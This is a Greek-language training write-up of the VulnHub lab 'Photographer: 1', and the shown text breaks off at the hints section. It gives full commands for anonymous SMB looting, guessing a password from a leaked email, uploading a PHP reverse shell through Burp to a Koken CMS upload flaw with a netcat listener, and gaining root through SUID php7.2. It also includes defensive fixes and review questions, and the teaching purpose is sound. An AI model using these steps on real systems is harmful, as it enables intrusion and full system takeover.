# Μηχάνημα 11 — Photographer: 1

> **Θέση:** 11 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **055** από 708)
> **Πλήρες αγγλικό walkthrough:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Photographer: 1 |
| **Δημιουργός** | Vinícius Vieira ("v1n1v131r4") |
| **Κυκλοφορία** | 21 Ιουλίου 2020 |
| **Λειτουργικό** | Ubuntu 16.04 (EOL) — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **VulnHub** | [entry/photographer-1,519](https://vulnhub.com/entry/photographer-1,519/) |
| **Σημαίες** | 2 — `/home/daisa/user.txt`, `/root/proof.txt` |
| **Εκτιμώμενος χρόνος** | 4–6 ώρες |

---

## Πώς να χρησιμοποιήσετε αυτή την κάρτα

Ίδιο πρότυπο: **Α** (μέθοδος + θεωρία) · **Β** (το μηχάνημα και ο χάρτης του) · **Γ** (κάθε εντολή, λογικά) · **Δ–Η** (άμυνα, επανάληψη, υποδείξεις, παραπομπές, διάσωση). Η νέα θεωρία εδώ: **ανώνυμες συνεδρίες SMB**, **συμπερασμός διαπιστευτηρίων από διερχόμενο email**, **αποτύπωση CMS από κεφαλίδες HTTP**, **client-side vs server-side επικύρωση**, **παραποίηση αιτήματος εν πτήσει**, και **SUID σε διερμηνέα**.

---

# Μέρος Α — Η μέθοδος (θεωρία)

## Α.1 Ανώνυμο SMB: τι σημαίνουν τα `READ ONLY` και `NO ACCESS`

Το **SMB** (Server Message Block, θύρες 139/445) είναι το πρωτόκολλο κοινής χρήσης αρχείων και εκτυπωτών των Windows, υλοποιημένο στο Linux από το **Samba**· ένας server εκθέτει **μερίσματα (shares)** — ονομασμένους φακέλους που προσαρτάτε και περιηγείστε. Το `smbmap` απαντά στην **μόνη ερώτηση που μετράει**: μπορείς να το **διαβάσεις**, μπορείς να **γράψεις** σε αυτό; `READ ONLY` = διαβάζεις, δεν γράφεις — **αρκετό** για έναν επιτιθέμενο, γιατί τα δεδομένα σε ηρεμία κρύβουν **μυστικά**. `NO ACCESS` = δεν μπορείς καν να το δεις. Η **ανώνυμη/guest** πρόσβαση — κενά διαπιστευτήρια, μια **null session** — είναι από τα πιο συνηθισμένα ευρήματα σε εσωτερικές αξιολογήσεις· **δοκιμάστε τη πάντα πρώτη**.

## Α.2 Συμπερασμός διαπιστευτηρίων από διερχόμενο email

Η είσοδος **δεν** είναι ευπάθεια κώδικα — είναι ένα **ανώνυμο μερίσμα που περιέχει πραγματική εταιρική αλληλογραφία**. Το email παραδίδει δύο πλήρεις διευθύνσεις και υπονοεί τον κωδικό:

> *«Don't forget your secret, my babygirl ;)»*

Δύο πράγματα το κάνουν πάτημα: **η σύνδεση του Koken ζητά *email*, όχι όνομα χρήστη**, άρα η γραμμή `To:` *είναι* το αναγνωριστικό σύνδεσης· και η τονισμένη λέξη είναι **υπόδειξη κωδικού**, άρα μια **σύντομη, θεματική** λίστα μαντεψιών αντί για λεξικό 14 εκατομμυρίων γραμμών. **Οι πραγματικές έρευνες παραβίασης είναι γεμάτες με αυτό** — ένα ticket, ένα προωθημένο email, ένας κωδικός που κανένα λεξικό δεν θα έβρισκε. Τα δύο ονόματα είναι επίσης η πρώτη σας εικασία για **τοπικά ονόματα χρηστών** — το `/etc/passwd` τα επιβεβαιώνει αργότερα.

## Α.3 Αποτύπωση CMS από κεφαλίδες

Η απάντηση ενός web server συχνά **ονομάζει το λογισμικό και την ακριβή του έκδοση**: το script `http-generator` του Nmap διαβάζει την ετικέτα `<meta name="generator">` της σελίδας και τυπώνει `http-generator: Koken 0.22.24`. Η ροή εργασίας είναι πάντα **έκδοση πρώτα, έρευνα μετά**: `Koken 0.22.24` + `X-Powered-By: PHP/7.2.24` σε Ubuntu 16.04 → `searchsploit koken`. Ούτε η έκδοση της PHP είναι λεπτομέρεια — σας λέει **ποιο binary διερμηνέα να κυνηγήσετε** αργότερα στο πέρασμα SUID (`/usr/bin/php7.2`).

## Α.4 Client-side vs server-side επικύρωση

Το **EDB 48706** (το δημόσιο proof-of-concept για αυτό το bug του CMS) λέει: *«checks the file extension on the CLIENT side only (JavaScript)»* — ο **browser** απορρίπτει το `.php`, αλλά **ο server δεν ελέγχει καθόλου την κατάληξη**. Άρα η διόρθωση δεν είναι ένα έξυπνο όνομα αρχείου· είναι να **στείλετε ό,τι αρνήθηκε ο browser**, τροποποιώντας το αίτημα **εν πτήσει** με έναν **intercepting proxy** (Burp Suite). Η αρχή: **επικύρωση που εκτελείται στον client δεν είναι έλεγχος — είναι εξυπηρέτηση UI.** Όποιος ελέγχει τον browser ελέγχει το αίτημα· ο server πρέπει να μεταχειρίζεται καθετί που φτάνει ως εχθρικό input.

## Α.5 SUID σε **διερμηνέα** — και η σημαία `-p`

Το **SUID** (*set-user-ID*) είναι ένα bit δικαιώματος που κάνει ένα πρόγραμμα να τρέχει με τα προνόμια του **ιδιοκτήτη του αρχείου**, όχι του καλούντος — διαβάζεται ως `s` εκεί που θα ήταν το `x` του ιδιοκτήτη (`-rwsr-xr-x`). Υπάρχει για έναν λόγο (το `/usr/bin/passwd` πρέπει να γράψει το `/etc/shadow` για εσάς), αλλά πάνω σε έναν **διερμηνέα** — `php`, `python`, `perl`, `bash`, `vim`, `less`, `tar`, `find`, `awk` — είναι καταστροφικό: ένας διερμηνέας διαβάζει/γράφει αρχεία, ξεκινά διεργασίες, ανοίγει sockets. **Το να δίνετε σε έναν τοπικό χρήστη SUID-root διερμηνέα είναι το να του δίνετε root.** Σχετικό: κάθε διεργασία έχει ένα **πραγματικό UID** (ποιος είστε) και ένα **effective UID** (τι ελέγχει ο πυρήνας)· η ανύψωση SUID αλλάζει μόνο το *effective* — γι' αυτό το `id` θα δείξει αργότερα `uid=33(www-data)` και `euid=0(root)` μαζί.

**Το `-p` είναι υποχρεωτικό:** το bash **ρίχνει σκόπιμα** το effective UID του όταν είναι setuid — θωράκιση — εκτός αν κληθεί με `-p` («privileged mode»). Χωρίς αυτό: `$`, χωρίς root, και ένα λανθασμένο συμπέρασμα αποτυχίας.

---

# Μέρος Β — Το μηχάνημα

## Β.1 Τι θα μάθετε

1. Να απαριθμείτε SMB και να ερμηνεύετε **`READ ONLY`** vs **`NO ACCESS`**.
2. Να κατεβάζετε και να αναλύετε αρχεία από ένα **ανώνυμο μερίσμα** (null session).
3. Να **συμπεραίνετε ένα διαπιστευτήριο** από ένα ανεπίσημο email αντί να το σπάτε.
4. Να **αποτυπώνετε ένα CMS από τις κεφαλίδες απόκρισης HTTP**.
5. Να καταλαβαίνετε την **επικύρωση μόνο στον client** και γιατί δεν είναι έλεγχος.
6. Να χρησιμοποιείτε το **Burp Suite** για να υποκλέπτετε και να τροποποιείτε ένα αίτημα εν πτήσει.
7. Να **εντοπίζετε ένα ανεβασμένο αρχείο** διαβάζοντας το UI της ίδιας της εφαρμογής και τις συμβάσεις αποθήκευσής της.
8. Να ανυψώνετε προνόμια μέσω **SUID PHP**, και να καταλαβαίνετε την κρίσιμη σημαία **`-p`**.
9. Να διαβάζετε την έξοδο του `id` για να ξεχωρίζετε το **real UID** από το **effective UID**.

## Β.2 Ο χάρτης

| Στάδιο | Πού |
| --- | --- |
| **Ανώνυμο SMB με αλληλογραφία** | `sambashare` :445 → `mailsent.txt`, `wordpress.bkp.zip` |
| **Συμπερασμός διαπιστευτηρίου** | "my babygirl" → κωδικός **`babygirl`** |
| Admin panel εκτεθειμένο | `:8000/admin/` |
| **CMS αυθαίρετη μεταφόρτωση αρχείου** | Koken 0.22.24, **EDB 48706** — έλεγχος μόνο client-side |
| Παραποίηση αιτήματος | **Burp** για αφαίρεση του `.jpg` |
| Μεταφορτώσεις μέσα στο document root | `/storage/originals/…/shell.php` |
| Επαναχώρηση διαπιστευτηρίων: κωδικός CMS = κωδικός συστήματος | `daisa` / `babygirl` → user flag |
| **SUID σε διερμηνέα PHP** | `/usr/bin/php7.2` mode **`4755`** → `euid=0` |

## Β.3 Πριν ξεκινήσετε

- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) **§2** (SMB, και τι να κυνηγάτε σε μερίσματα).
- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) **§6** (μεταφόρτωση αρχείου → web shell) και §7 (σημειώσεις CMS).
- [04 — Διαπιστευτήρια και Σπασίματα](<../04-Διαπιστευτήρια-και-Σπασίματα.md>) **§5** (επαναχώρηση).

**Απαντήστε πριν:**
1. Τι σημαίνει `READ ONLY` στο `smbmap`, και αρκεί για έναν επιτιθέμενο;
2. Ένα email λέει *«Don't forget your secret, my babygirl»*. Ποια είναι η λίστα υποψηφίων κωδικών σας, με ποια σειρά;
3. Ένα CMS διαφημίζεται σε κεφαλίδα απόκρισης HTTP. Γιατί είναι εύρημα;
4. Τι είναι η **client-side** επικύρωση, και γιατί ο επιτιθέμενος μπορεί να την αγνοήσει εντελώς;
5. Τι κάνει η σημαία `-p` όταν ξεκινάτε κέλυφος από ένα SUID binary;

---

# Μέρος Γ — Η διαδρομή, βήμα-βήμα

## Βήμα 1 — Σάρωση

**Πρώτα η θεωρία.** Μια σάρωση θυρών είναι ο χάρτης πάνω στον οποίο σχεδιάζεται όλη η αποστολή. Το `-p-` επιβάλλει **όλες τις 65 535 θύρες** (οι υπηρεσίες κρύβονται σε `:8000` και παρόμοια), το `-sV` αποτυπώνει εκδόσεις για το `searchsploit`, το `-sC` τρέχει τα προεπιλεγμένα scripts, το `-T4` είναι η σωστή ταχύτητα lab, το `-oN` κρατά τα τεκμήρια.

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

```text
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
```

**Πώς το διαβάζετε.** **Δύο web servers, δύο διαφορετικά sites.** Η θύρα 80 είναι ένα στατικό portfolio (η βιτρίνα του δημιουργού)· η θύρα 8000 είναι μια **εφαρμογή**. Η γραμμή `http-generator` είναι **η πιο πολύτιμη γραμμή της σάρωσης**: το **όνομα και η ακριβής έκδοση του CMS**, δωρεάν. Μια πλήρης εκτέλεση δείχνει επίσης `smb-security-mode … account_used: guest` — **το ανώνυμο SMB δουλεύει** προτού πληκτρολογήσετε οποιοδήποτε διαπιστευτήριο. **Το `-p-` μέτρησε**: μια εφαρμογή στην 8000 με τίποτα στην 80 είναι ένα συνηθισμένο σχήμα που μια σάρωση προεπιλεγμένων θυρών θα είχε χάσει εντελώς.

**Πώς να βρείτε το `/admin/`;** Το ίδιο το HTML της θύρας 8000 συνδέει προς αυτό (`href="/admin/"`)· τα `dirb`/`gobuster` το επιβεβαιώνουν. **Παγίδα αρχάριου:** σάρωση μόνο της θύρας 80 — απαριθμήστε **κάθε** θύρα HTTP ξεχωριστά.

**Αμυντικό μάθημα:** η αποκάλυψη έκδοσης είναι δωρεάν πληροφορία. Αφαιρέστε την (`ServerTokens Prod`, `expose_php = Off`) — αλλά η καταστολή μόνο *επιβραδύνει* έναν επιτιθέμενο· η πραγματική διόρθωση είναι το patching.

## Βήμα 2 — SMB: ανώνυμο μερίσμα πρώτα

**Πρώτα η θεωρία.** Το `smbmap` απαριθμεί κάθε μερίσμα **και το δικό σας δικαίωμα** σε μία κίνηση· μετά το `smbclient` περιηγείται. Το `-N` (ή ένας κενός κωδικός) ζητά μια **null session** — καθόλου διαπιστευτήρια.

```bash
smbmap -u guest -H TARGET
smbclient -L //TARGET -N
smbclient //TARGET/sambashare -N
smb: \> dir
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

```text
Disk              Permissions  Comment
----              -----------  -------
print$            NO ACCESS    Printer Drivers
sambashare        READ ONLY    Samba on Ubuntu
IPC$              NO ACCESS    IPC Service (photographer server)

mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020
```

**Πώς το διαβάζετε.** Η στήλη **Permissions** είναι όλο το νόημα: το `sambashare` είναι **READ ONLY** — όχι εγγράψιμο, και **παρ' όλα αυτά αρκετό** (Α.1). Το `IPC$` δεν είναι πραγματικό μερίσμα αρχείων αλλά το κανάλι RPC που χρησιμοποιεί το `enum4linux`. Μέσα στο `smbclient`, το `dir` καταγράφει και το `get FILE` κατεβάζει. (Τα μεγέθη αρχείων ποικίλλουν μεταξύ εκδόσεων της εικόνας — καλλωπιστικό.)

```text
From: Agi Clarence <agi@photographer.com>
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

**Πώς το διαβάζετε.** Στύψτε κάθε σταγόνα από πέντε γραμμές. **Δύο πλήρεις διευθύνσεις** — και η σύνδεση του Koken θέλει *email*, άρα το `daisa@photographer.com` είναι το **αναγνωριστικό σύνδεσής** σας. Το *«Your site is ready now»* δένει τη θύρα 8000 με τη Daisa, την προφανή **διαχειρίστρια**· το *«my babygirl ;)»* είναι η **υπόδειξη κωδικού** — το `babygirl` πάει πρώτο. **Αμυντικό μάθημα:** μη βάζετε ποτέ αλληλογραφία σε μερίσμα προσβάσιμο από guests — ο επιτιθέμενος δεν χρειάστηκε καν να σπάσει κρυπτογραφία.

## Βήμα 3 — Το decoy backup

**Πρώτα η θεωρία.** Ένα backup σε δημόσιο μερίσμα μοιάζει με τζακπότ: τα config του CMS (`wp-config.php`, `.env`) κρατούν κατ' ανάγκη **διαπιστευτήρια βάσης σε καθαρό κείμενο**. Ελέγξτε τα περιεχόμενα, όχι μόνο την ύπαρξη.

```bash
unzip -l wordpress.bkp.zip | head -20
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i password
```

```text
(no wp-config.php in the archive — only the stock sample)
```

**Πώς το διαβάζετε.** Το `-l` απαριθμεί τα περιεχόμενα **χωρίς εξαγωγή**· το `-p FILE` τυπώνει ένα μέλος στο stdout. **Δεν υπάρχει `wp-config.php`** — μόνο το stock δείγμα, άρα καθόλου μυστικά. **Παγίδα αρχάριου:** να ξοδέψετε ώρες σε ένα decoy. Επιθεωρείτε πάντα πρώτα τα περιεχόμενα ενός backup — τα πραγματικά backups **συχνά** περιέχουν `wp-config.php`, `.env`, `id_rsa`, `*.sql`, άρα το αδιέξοδο δεν κάνει τη συνήθεια λάθος. **Αμυντικό μάθημα:** ένα εκτεθειμένο backup είναι από μόνο του αναφέρσιμο εύρημα.

## Βήμα 4 — Αποτύπωση της εφαρμογής

**Πρώτα η θεωρία.** Έχετε μια έκδοση (Βήμα 1)· τώρα δέστε την με μια ευπάθεια. Το `searchsploit` είναι το **offline** αντίγραφο του Exploit-DB του Kali. **Διαβάστε κάθε exploit πριν το τρέξετε.**

```bash
curl -sI http://TARGET:8000/admin/
searchsploit koken
searchsploit -m php/webapps/48706.txt && cat 48706.txt
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
Set-Cookie: koken_session_ci=...; path=/; HttpOnly

Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) | php/webapps/48706.txt

The import function checks the file extension on the CLIENT side only (JavaScript) ...
```

**Πώς το διαβάζετε.** Το `curl -sI` φέρνει **μόνο τις κεφαλίδες**· το `X-Powered-By: PHP/7.2.24` προϊδεάζει διακριτικά για το SUID binary `/usr/bin/php7.2` που κυνηγάτε στο Βήμα 9. Η έκδοση ταιριάζει ακριβώς με το EDB-48706 — και ο συντάκτης του (`v1n1v131r4`) είναι **ο δημιουργός του VM**, άρα αυτή είναι η προβλεπόμενη διαδρομή. Η φράση-κλειδί — *«checks the extension on the **CLIENT** side»* — είναι όλο το σχέδιο επίθεσής σας (Α.4): περάστε τον έλεγχο του browser, μετά ξαναγράψτε το όνομα αρχείου στο Burp. Προσέξτε το `storage/originals/` στο HTML της σελίδας — έχει σημασία στο Βήμα 6.

## Βήμα 5 — Σύνδεση με το συμπερασμένο διαπιστευτήριο

```text
http://TARGET:8000/admin/
Email:    daisa@photographer.com
Password: babygirl
→ "Welcome back, Daisa."
```

**Δούλεψε με την πρώτη** — η υπόδειξη ήταν κυριολεκτική. **Αν το `babygirl` δεν είχε δουλέψει**, η σωστή κλιμάκωση είναι μια **θεματική** λίστα, όχι μεγαλύτερη:

```bash
cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa daisaahomi babygirl2020 secret mybabygirl >> daisa_words.txt
sort -u daisa_words.txt -o daisa_words.txt
```

**Γιατί.** Το `cewl` συγκομίζει το **ίδιο** το λεξιλόγιο του ιστότοπου — καλύτερο από το rockyou για αυτόν τον λογαριασμό· οι προσαρτημένες παραλλαγές είναι οι τυπικοί μετασχηματισμοί, και το **`sort -u -o` αφαιρεί τα διπλότυπα με ασφάλεια**. Μόνο τότε σκεφτείτε brute force (`hydra … http-post-form») — το στοχευμένο κερδίζει το ογκομετρικό. **Αμυντικό μάθημα:** βάλτε rate limiting στις συνδέσεις admin και ελέγξτε τους κωδικούς απέναντι σε σώματα διαρροών· το `babygirl` είναι σε όλα.

## Βήμα 6 — Μεταφόρτωση, υποκλοπή, μετάλλαξη

**Πρώτα η θεωρία.** Κάθε επίθεση μεταφόρτωσης αρχείου έχει έναν στόχο: **να βάλει ένα αρχείο σε έναν κατάλογο που εκτελεί ο web server, με κατάληξη που ο server θα τρέξει**. Το Koken μόνο *φαίνεται* να ελέγχει την κατάληξη — ο έλεγχος τρέχει στον browser. Εξ ου δύο αντίγραφα: το `shell.php.jpg` περνά τον έλεγχο του browser· το Burp το ξαναγράφει σε `shell.php` πριν το δει ο server.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/127.0.0.1/ATTACKER/; s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php          # VERIFY before uploading
cp shell.php shell.php.jpg
```

Στο admin του Koken: **Library → Import content**, ξεκινήστε το intercept του Burp, ανεβάστε το `shell.php.jpg`, και στο υποκλαπέν multipart αίτημα αλλάξτε το όνομα αρχείου **όπου κι αν εμφανίζεται**:

```http
Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
→
Content-Disposition: form-data; name="files[]"; filename="shell.php"
```

```text
{"id":17,"title":"shell","filename":"shell.php","storage":{...}}
http://TARGET:8000/storage/originals/3c/13/shell.php
```

**Πώς το διαβάζετε.** Παγίδα μέσα στο αίτημα: το `Content-Type` λέει ήδη `image/jpeg` — **ο browser το έθεσε από το όνομα αρχείου**, εξίσου άνευ σημασίας με τον έλεγχο της κατάληξης. Το JSON επιβεβαιώνει την αποθήκευση, και το `storage` αποκαλύπτει τον **δι-επίπεδο hashed κατάλογο** (`3c/13/`) — **όχι μαντεύσιμο**. Μάθετε τη διαδρομή από την απόκριση, ή περάστε τον κέρσορα πάνω από το **Download File** στη βιβλιοθήκη Content του admin. **Το `grep` πριν τη μεταφόρτωση είναι το βήμα επαλήθευσης** — ένα μη επεξεργασμένο shell που καλεί το `127.0.0.1:1234` κοστίζει μια ώρα σύγχυσης. **Παγίδα αρχάριου:** να ανεβάσετε, να δείτε «success», και να μην ελέγξετε ποτέ πού πήγε το αρχείο.

## Βήμα 7 — Πυροδότηση

**Πρώτα η θεωρία.** Ένα **reverse shell** (ο στόχος συνδέεται πίσω σε *εσάς*) κερδίζει ένα bind shell: η εξερχόμενη κίνηση σχεδόν ποτέ δεν φιλτράρεται. **Listener πρώτα, πυροδότηση μετά.**

```bash
nc -lvnp 4444                                  # Kali, first: -l listen -v verbose -n no DNS -p port
curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
```

```text
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Πώς το διαβάζετε.** **Γιατί η επίσκεψη στο URL εκτέλεσε PHP:** ο Apache δρομολογεί με βάση την **κατάληξη** — τα `*.php` πάνε στον διερμηνέα — και το `storage/originals/` βρίσκεται μέσα στο document root. Αν κρατούσατε το `.jpg`, ο Apache θα είχε σερβίρει bytes ως εικόνα. **Η μεταφόρτωση και η εκτέλεση επιτόπου είναι τα δύο μισά κάθε RCE μεταφόρτωσης.** Το `uid=33(www-data)` είναι ο χωρίς προνόμια Apache worker του Ubuntu — πάτημα, όχι σημαία. Αναβαθμίστε αμέσως το σακάτικο κέλυφος (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, μετά `Ctrl+Z`, `stty raw -echo`, `fg`) — αλλιώς τα `su`/`sudo` αποτυγχάνουν και σας παραπλανούν.

## Βήμα 8 — Η user flag είναι πραγματικό όριο

```bash
cat /etc/passwd | grep -v nologin | grep -v /bin/false
ls -la /home/daisa/
cat /home/daisa/user.txt
```

```text
agi:x:1000:1000:Agi Clarence,,,:/home/agi:/bin/bash
daisa:x:1001:1001:Daisa Ahomi,,,:/home/daisa:/bin/bash

-rw------- 1 daisa daisa 38 Jul 21 03:44 user.txt
cat: /home/daisa/user.txt: Permission denied
```

**Πώς το διαβάζετε.** Το `/etc/passwd` επιβεβαιώνει ότι οι δύο άνθρωποι από το email είναι πραγματικοί τοπικοί λογαριασμοί — OSINT που γίνεται γεγονός συστήματος. `-rw-------`, ιδιοκτήτης `daisa`: **μόνο η daisa μπορεί να το διαβάσει**, άρα ο `www-data` παίρνει `Permission denied` — ένα **γνήσιο όριο σημαίας**· ένα κέλυφος δεν είναι σημαία. Δύο δρόμοι μπροστά: **επαναχώρηση του κωδικού Koken** (`su daisa` / `babygirl` — επαναχώρηση CMS→σύστημα, η πιο συνηθισμένη πλάγια μετακίνηση σε πραγματικά engagements), ή ευθεία προς root (Βήμα 9). *(Κάποια writeups δείχνουν το `user.txt` να διαβάζεται απευθείας ως `www-data`· στην τρέχουσα εικόνα το όριο είναι πραγματικό — σχεδιάστε για `su`.)*

## Βήμα 9 — Ο έλεγχος, και γιατί δείχνει SUID

**Πρώτα η θεωρία.** Η μετα-εκμετάλλευση είναι ένας **έλεγχος που δουλεύεται από τον φθηνότερο πρώτα**, ποτέ αυτοσχεδιασμός: `sudo -l` (τι μπορώ ήδη να τρέξω ως root;), SUID, capabilities, cron, εγγράψιμα αρχεία, διαπιστευτήρια, ομάδες, πυρήνας τελευταίος — ένα exploit πυρήνα μπορεί να προκαλέσει panic στο VM.

```bash
sudo -l; cat /etc/crontab; uname -r
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/php7.2
```

```text
/bin/ping  /bin/mount  /bin/su  /usr/bin/passwd  /usr/bin/chfn  ...
/usr/bin/php7.2                     <-- NOT stock

-rwsr-xr-x 1 root root 4538528 Jan 14  2020 /usr/bin/php7.2
```

**Πώς το διαβάζετε.** Το `sudo -l` δεν προσφέρει τίποτα, το crontab είναι όλο προεπιλεγμένο, ο πυρήνας (4.4.0-178, patched Απρίλιο 2020) έχει το Dirty COW και το overlayfs διορθωμένα από καιρό — άρα: **SUID**. Το `2>/dev/null` θάβει τα σφάλματα δικαιωμάτων που θα έκρυβαν την απάντηση. **Συγκρίνετε με το stock baseline** ώστε η παράξενη εγγραφή να ξεπηδήσει: μόνο το `php7.2` δεν είναι προεπιλεγμένο. Αποκωδικοποιήστε το `-rwsr-xr-x`: ιδιοκτήτης root σημαίνει `chmod u+s` — **ποτέ προεπιλογή πακέτου** — και το `others` περιλαμβάνει τον `www-data`. **Αμυντικό μάθημα:** κάντε diff των SUID αρχείων απέναντι σε ένα baseline (`aide`, `osquery`) — ένα νέο SUID αρχείο θα έπρεπε να ειδοποιεί κάποιον.

## Βήμα 10 — Ανύψωση προνομίων

**Πρώτα η θεωρία.** Αναζητήστε το binary στο **GTFOBins** πριν επινοήσετε οτιδήποτε — η καταχώρησή του για SUID PHP τεκμηριώνει αυτή τη διαφυγή: το `pcntl_exec` **αντικαθιστά την εικόνα της διεργασίας**, μεταφέροντας το προνόμιο SUID.

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
id
cat /root/proof.txt
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

**Ανατομία της εντολής — κάθε μέρος είναι φορτίο:**

| Μέρος | Σημασία |
| --- | --- |
| `/usr/bin/php7.2` | η **απόλυτη διαδρομή**. Το σκέτο `php -r …` μπορεί να λύσει σε άλλη, μη-SUID PHP |
| `-r "code"` | τρέξε PHP απευθείας, χωρίς αρχείο |
| `pcntl_exec('/bin/sh', …)` | η συνάρτηση **ελέγχου διεργασίας** της PHP: αντικαθιστά την τρέχουσα διεργασία με `/bin/sh`, άρα το νέο κέλυφος **κληρονομεί** το effective UID αντί να ξεκινήσει ως παιδί |
| `['-p']` | privileged mode — **υποχρεωτικό** |

**Το να ξεχάσετε το `-p` είναι το λάθος νούμερο ένα εδώ** — το bash ανιχνεύει ότι είναι setuid και *ρίχνει* το effective UID μόνο του: ένα κανονικό `$`, χωρίς σφάλμα. Διαβάστε το `id` σωστά: το `uid=33(www-data)` είναι το **πραγματικό** UID, το `euid=0(root)` το **effective** που συμβουλεύεται ο πυρήνας — πλήρης root, αλλά **ανύψωση SUID, όχι σύνδεση**, γι' αυτό η αρχική ταυτότητα παραμένει στο αρχείο. `cat /root/proof.txt` — **και οι δύο σημαίες πιάστηκαν.** *(Το GTFOBins παραθέτει ισοδύναμα, π.χ. `-r "posix_setuid(0); system('/bin/bash -p');"`.)*

---

# Μέρος Δ — Αμυντικά μαθήματα

| Εύρημα | Διόρθωση |
| --- | --- |
| **Ανώνυμο SMB με αλληλογραφία** | Απενεργοποιήστε την ανώνυμη/guest πρόσβαση· απαιτήστε πιστοποίηση σε κάθε μερίσμα· έλεγχος ανά τρίμηνο |
| SMB signing disabled | `server signing = mandatory`· μπλοκάρει επιθέσεις relay |
| Email που διέρρευσε με υπόδειξη κωδικού | DLP στα shares· ευαισθητοποίηση χρηστών· ποτέ υποδείξεις κωδικού σε κοινόχρηστα έγγραφα |
| **`babygirl` ως κωδικός** | Επιβάλετε μήκος + έλεγχο διαρρευσάντων κωδικών· απαιτήστε MFA στο admin του CMS |
| Admin panel προσβάσιμο από το δίκτυο | Δέστε το `:8000/admin/` σε localhost ή σε management VLAN· απαιτήστε VPN |
| **Επικύρωση μεταφόρτωσης μόνο client-side (EDB 48706)** | Επικύρωση server-side: allow-list καταλήξεων, έλεγχος MIME **και** περιεχομένου, και **re-encode** των εικόνων (που αφαιρεί το προσαρτημένο PHP) |
| Μεταφορτώσεις αποθηκευμένες στο document root με την κατάληξη του επιτιθέμενου | Αποθηκεύστε εκτός web root· `Content-Disposition: attachment`· απενεργοποιήστε τη μηχανή PHP για αυτόν τον κατάλογο |
| `http-generator` / `X-Powered-By` αποκαλύπτουν εκδόσεις | Καταστείλτε τα — αλλά η καταστολή μόνο επιβραδύνει έναν επιτιθέμενο· η πραγματική διόρθωση είναι η αναβάθμιση |
| **Κωδικός CMS = κωδικός συστήματος** | Μοναδικά διαπιστευτήρια ανά υπηρεσία· secrets manager· ειδοποίηση σε επικάλυψη διαπιστευτηρίων |
| **SUID root στο `/usr/bin/php7.2`** | `chmod u-s`. Ένας SUID διερμηνέας είναι root για όποιον μπορεί να τον τρέξει |
| Χωρίς sandboxing του web server (χωρίς ενεργό προφίλ AppArmor) | Επαληθεύστε το `aa-status`· περιορίστε την PHP με `open_basedir`· `ProtectSystem=strict` υπό systemd |
| Ubuntu 16.04 (EOL· το ίδιο το Koken καταργήθηκε από τον προμηθευτή του) | Αναβαθμίστε — η ρίζα πίσω από πολλά ευρήματα· δεν θα υπάρξει νέο patch του Koken |

**Το μεγαλύτερο δίδαγμα:** *οι άνθρωποι γράφουν τα μυστικά τους.* Η ευπάθεια δεν ήταν στο Koken, ούτε στο Samba ούτε στην PHP — ήταν ένα email σε ανοιχτό μερίσμα αρχείων. Τα τεχνικά controls μετράνε, αλλά το ίδιο και το ανθρώπινο στρώμα, και συνήθως είναι πιο αδύναμο.

---

# Μέρος Ε — Ερωτήσεις επανάληψης

1. Πώς πήρατε τον κωδικό χωρίς να σπάσετε τίποτα; Γιατί είναι αυτό **πιο** ανησυχητικό για τον αμυνόμενο από έναν αδύναμο κωδικό;
2. Το `smbmap` έλεγε `READ ONLY`. Γιατί αρκούσε η ανάγνωση και μόνο για να παραβιαστεί ολόκληρο το μηχάνημα;
3. Ο έλεγχος κατάληξης ήταν σε JavaScript. Τι σημαίνει αυτό ακριβώς για το **ποιος** τον επιβάλλει, και ποια είναι η ελάχιστη server-side αλλαγή που θα το διόρθωνε;
4. Γιατί χρειαστήκατε το Burp αντί για `curl` εδώ; Θα μπορούσατε να το κάνετε με `curl`;
5. Πώς βρήκατε τη διαδρομή του ανεβασμένου αρχείου; Ονομάστε δύο ανεξάρτητες μεθόδους.
6. Γιατί δούλεψε το `pcntl_exec('/bin/sh', ['-p'])` ενώ το σκέτο `/bin/sh` όχι;
7. Ο κωδικός του CMS ισούταν με τον κωδικό του συστήματος. Ποια **μία** πολιτική το σταματά;
8. Η Ubuntu 16.04 είναι EOL. Μαζί με την απουσία προφίλ AppArmor, ποιο είναι το σωρευτικό αποτέλεσμα;

---

# Μέρος ΣΤ — Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

